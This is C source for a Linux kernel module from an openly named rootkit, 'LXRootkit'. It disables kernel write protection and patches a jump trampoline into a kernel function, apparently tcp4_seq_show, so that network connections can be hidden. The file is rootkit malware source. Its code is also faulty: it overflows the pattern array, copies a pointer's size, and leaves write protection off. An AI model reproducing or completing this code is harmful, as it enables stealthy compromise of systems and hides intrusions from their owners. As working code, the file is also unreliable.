
#include <linux/kernel.h>
#include <linux/module.h>

#include "hardware.h" 

struct inlHook 
{
    unsigned long targetFunc;   /* target function */
    unsigned long myFunc;       /* our hook */
}; 

/* mov rax, [addr] pattern */ 
static unsigned char movPattern[] = {  0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00};  
/* jmp rax pattern */ 
static unsigned char jmpPattern[] = { 0xFF, 0xE0 }; 

static struct inlHook hook;

void startHook(unsigned long toHook, unsigned long theHook)
{

    /* saving hook function address */ 
    hook.myFunc = (unsigned long)theHook; 
     
    /* saving the target function address inorder to resume execution*/ 
    hook.targetFunc = toHook; 
    
    /* moving the hook function address to RAX register */ 
    *(unsigned long*)&movPattern[3] = (unsigned long)theHook;
   
    /* allocating a buffer for the pattern */ 
    size_t szMovPattern = sizeof(movPattern); 
    size_t szJmpPattern = sizeof(jmpPattern); 
    unsigned char* buffer = (unsigned char*)kvzalloc(szMovPattern, GFP_KERNEL); 
   
    if(buffer == NULL) 
    {
        printk(KERN_INFO "[-] LXRootkit: kvzalloc() failed to allocate: %d bytes for the mov pattern\n", szMovPattern);
        return; 
    }

    /* copying the pattern to the allocated buffer */ 
    memcpy(buffer, movPattern, szMovPattern); 

    wpOFF(); 

    /* copying the rest of the pattern to the target function */ 
    memcpy(toHook, buffer, sizeof(buffer));
    /* moving 7 bytes to copy to the next instruction */ 
    memcpy((unsigned long)(toHook+7), jmpPattern, szJmpPattern);

    kvfree(buffer); 
}

void stopHook(void)
{
    /* original tcp4_seq_show prolog */ 
    static unsigned char patternOld[] =  { 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x48, 0x89, 0xFD, 0x53 }; 

    wpOFF(); 
    memcpy(hook.targetFunc, patternOld, sizeof(patternOld)); 
    wpON(); 
}
